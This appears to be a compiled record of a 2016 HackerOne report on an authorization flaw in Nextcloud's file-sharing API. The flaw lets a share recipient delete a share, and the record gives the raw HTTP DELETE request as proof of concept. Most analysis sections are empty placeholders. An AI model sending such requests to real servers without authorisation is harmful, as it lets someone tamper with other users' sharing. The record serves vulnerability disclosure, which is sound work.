# IDOR - Disable sharing

## Metadata
- **Source:** HackerOne
- **Report:** 153905 | https://hackerone.com/reports/153905
- **Submitted:** 2016-07-26
- **Reporter:** dalt4sec
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** low
- **Vuln:** Privilege Escalation
- **CVEs:** CVE-2016-9464
- **Category:** web-api

## Summary
Decription:
-----
Users are shared files or folder. can disable this sharing.

Detail:
------
 + use request:

DELETE /nextcloud/ocs/v2.php/apps/files_sharing/api/v1/shares/[share-id]?format=json HTTP/1.1
Host: [your-host]
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
requesttoken: [t

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Decription:
-----
Users are shared files or folder. can disable this sharing.

Detail:
------
 + use request:

DELETE /nextcloud/ocs/v2.php/apps/files_sharing/api/v1/shares/[share-id]?format=json HTTP/1.1
Host: [your-host]
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
requesttoken: [token of user is shared]
OCS-APIREQUEST: true
X-Requested-With: XMLHttpRequest
Cookie: [cookie of user is shared]
Connection: keep-alive

Note:
----
only user is shared or user in group is shared can do it

</details>

---
*Analysed by Claude on 2026-05-24*
